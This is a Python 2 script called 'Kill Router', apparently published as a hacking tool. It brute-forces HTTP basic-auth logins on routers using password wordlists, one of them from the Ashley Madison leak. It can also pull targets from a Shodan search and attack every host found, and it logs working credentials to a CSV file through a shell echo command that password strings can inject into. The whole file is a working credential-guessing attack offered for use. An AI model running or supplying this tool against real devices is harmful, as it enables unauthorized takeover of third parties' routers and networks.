#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import sys
import argparse
import Queue
import shodan
import subprocess
from os import path
from termcolor import colored

#DIRECTORY INFOS
CURR_PATH = path.dirname(path.realpath(__file__))

#LOG FILE
logfile = CURR_PATH+"/results.csv"

# INSERT YOUR API KEY
SHODAN_API_KEY = ""
api = shodan.Shodan(SHODAN_API_KEY)

__AUTOR__   =   'Matheus Fidelis'
__GITHUB__  =   'https://github.com/msfidelis'
__BLOG__    =   'http://nanoshots.com.br'


def banner():
    print colored("""

    ██ ▄█▀ ██▓ ██▓     ██▓        ██▀███   ▒█████   █    ██ ▄▄▄█████▓▓█████  ██▀███
    ██▄█▒ ▓██▒▓██▒    ▓██▒       ▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
   ▓███▄░ ▒██▒▒██░    ▒██░       ▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
   ▓██ █▄ ░██░▒██░    ▒██░       ▒██▀▀█▄  ▒██   ██░▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
   ▒██▒ █▄░██░░██████▒░██████▒   ░██▓ ▒██▒░ ████▓▒░▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒
   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░     ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░
   ░ ░░ ░  ▒ ░  ░ ░     ░ ░        ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░   ░         ░     ░░   ░
   ░  ░    ░      ░  ░    ░  ░      ░         ░ ░     ░                 ░  ░   ░

								v1.0
    """, 'red', attrs=['bold'])


    
def helper():
    print colored("[*] By: Matheus Fidelis aka D0ctor", 'red', attrs=['bold'])
    print colored("[!] Usage: ./kill-router.py -t [TARGET IP] -p [TARGET PORT] -u [USER TO TEST] -l [PATH TO PASSLIST]", 'red', attrs=['bold'])
    print colored("[!] Usage: ./kill-router.py -t 192.168.0.1 -p 8080 -u admin -l passlist.txt", 'red', attrs=['bold'])
    print colored("[!] Use -m to change request HTTP to HTTPS", 'red', attrs=['bold'])
    print colored("[!] ./kill-router.py -t 192.168.0.1 -p 8080 -u admin -l passlist.txt -m https", 'red', attrs=['bold'])
    print colored("[!] ./kill-router.py --shodan apache2", 'red', attrs=['bold'])
    print ""
    
    

def definedefaultpasslist():
    #Passlists Default
    passlist10 = "/extras/wordlists/10.txt"
    passlist100 = "/extras/wordlists/100.txt"
    passlistAM = "/extras/wordlists/Ashley_Madison.txt" 
    passlistStp =  "/extras/wordlists/stupid.txt" 
    
    print ""
    print colored("[*] DEFINE A DEFAULT WORDLIST:", 'blue', attrs=['bold'])
    print colored("[+] 1 - Top 10~ Passwords Wordlist", 'blue', attrs=['bold'])
    print colored("[+] 2 - Top 100~ Passwords Wordlist", 'blue', attrs=['bold'])
    print colored("[+] 3 - Ashley Madison Wordlist", 'blue', attrs=['bold'])
    print colored("[+] 4 - Stupid Passwords Wordlist", 'blue', attrs=['bold'])
    
    response = int(raw_input("[!] SELECT A WORDLIST: "))
    print ""    
    
    if response == 1:
        passlist = passlist10
    elif response == 2:
        passlist = passlist100
    elif response == 3: 
        passlist = passlistAM
    elif response == 4:
        passlist = passlistStp

    return CURR_PATH + passlist
    
    
def validateapi():
    if SHODAN_API_KEY == "":
        print colored("[x] INVALID SHODAN API KEY:", 'red', attrs=['bold'])
        print colored("[!] Create a Account and Generate a new API KEY in https://account.shodan.io/login", 'red', attrs=['bold'])
        sys.exit()    
    
    
# Função responsável por retornar os registros da dork enviada para o Shodan
def shodanSearch(dork,ssl,passlist,username):
    validateapi()
    
    try:
        results = api.search(dork)

        #Mostra os Resultados
        print ""
        print colored("==========================[SHODAN RESULT]==========================",'yellow', attrs=['bold'])
        print ""
        print '[!] Results Found: %s' % results['total']
        print ""
        
        if results['total'] == 0:
            sys.exit()
            
        for result in results['matches']:
                print colored("==========================[%s]==========================",'yellow', attrs=['bold']) % result['ip_str']
                print ""
                print '[HEADER] %s' % result['data']
                print '[IP] %s' % result['ip_str']
                print '[PORT] %s' % result['port']
                print '[Country] %s' % result['location']['country_code']
                print '[Region] %s' % result['location']['region_code']
                print '[City] %s' % result['location']['city']
                print ''
                
        response = raw_input('YOU WANT TO TEST THE SHODAN RESULTS? Y/N: ')
        response = response.upper().strip()
                
        if response == "Y":
            if passlist is None: 
                passlist = definedefaultpasslist()
                
            for result in results['matches']: 
                try:
                    bruteforce(result['ip_str'], result['port'],ssl,passlist, username)
                except:
                    pass
        else: 
            sys.exit()

    except shodan.APIError, e:
        print 'Error: %s' % e


#FUNÇÃO RESPONSÁVEL PELO BRUTEFORCE
def bruteforce(target,port,ssl, passlist,username):

    url = '%s:%s' % (target, port)
    fd = open(passlist, 'rw')
    passwords = fd.readlines()
    passes = Queue.Queue()
        

    for password in passwords:
        password = password.rstrip()
        passes.put(password)

    i = 0
    print ""
    print colored("==========================[STARTING TEST]==========================",'yellow', attrs=['bold'])
    print colored("STARTING TEST ON HOST: %s",'blue', attrs=['bold']) % (url)
    print ""
    
    #VALIDA A CONEXÃO E/OU SE O ALVO ESTÁ DISPONÍVEL PARA REALIZAR O TESTE
    try:
        if ssl is True:
            validation = requests.get('https://'+url ,verify=False, timeout=8)
        else:
            validation = requests.get('http://'+url, timeout=8)
            
            if validation.status_code == 200:
                print colored("[X] INVALID TEST ", 'red', attrs=['bold'])
                return false
                
    except:
        print colored("[X] NO CONNECTION ", 'red', attrs=['bold'])
        return false

    while not passes.empty():
        password = passes.get()

        i = i + 1

        #AQUI IREMOS AVALIAR O PROTOCOLO, CASO ELE FOR TRUE, IRÁ REALIZAR REQUESTS COM O SSL
        try:
            if ssl is True:
                test = requests.get('https://'+url ,auth=(username, password), verify=False, timeout=8)
            else:
                test = requests.get('http://'+url, auth=(username, password), timeout=8)
        except:
            pass

        code = test.status_code
        print  colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password)
        if code == 200:
            print ""
            print colored("==========================[LOGIN FOUND]==========================", 'yellow', attrs=['bold'])
            print ""
            print colored("===================================================================", 'yellow', attrs=['bold'])
            print colored("               [  :: USER[%s] AND PASS[%s]  ]                      ", 'green', attrs=['bold']) % (username, password)
            print colored("===================================================================", 'yellow', attrs=['bold'])
            
            #GRAVA LOG
            log = "echo '%s;%s;%s;%s' >> %s" % (target, port, username, password, logfile)
            subprocess.call(log, shell=True)
            return True
        else:
            pass


def main():
    banner()
    
    target = ''
    passlist = ''
    username = ''

    #Faz o parsing dos argumentos
    parser = argparse.ArgumentParser(description = "Kill Router", add_help = False)
    parser.add_argument('-h', '--help', action=helper(), help='usage')
    parser.add_argument('-t', '--target',help='Informe o roteador alvo')
    parser.add_argument('-m', '--method',help='Informa o Método HTTP ou HTTPS')
    parser.add_argument('-p', '--port',help='Informa a porta')
    parser.add_argument('-l', '--passlist',help='Informa a passlist')
    parser.add_argument('-u','--username',help='Informa o usuário a ser testado')
    parser.add_argument('-s', '--shodan',help='Informa a Dork do Shodan')
    args = parser.parse_args()

    target = args.target
    port = args.port
    ssl = args.method
    passlist = args.passlist
    username = args.username
    
        
    if args.username is None:
        username = "admin"
    
    #Força o valor padrão para 80 caso a porta não seja especificada.
    if port is None:
        port = 80

    #Seta o valor default do method http ou https
    if ssl is None:
        ssl = False
    else:
        ssl = True
        
    if args.shodan != None:
        shodanSearch(args.shodan,ssl,passlist, username)

    try:    
        bruteforce(target,port,ssl, passlist,username)
    except:
        sys.exit()


main()
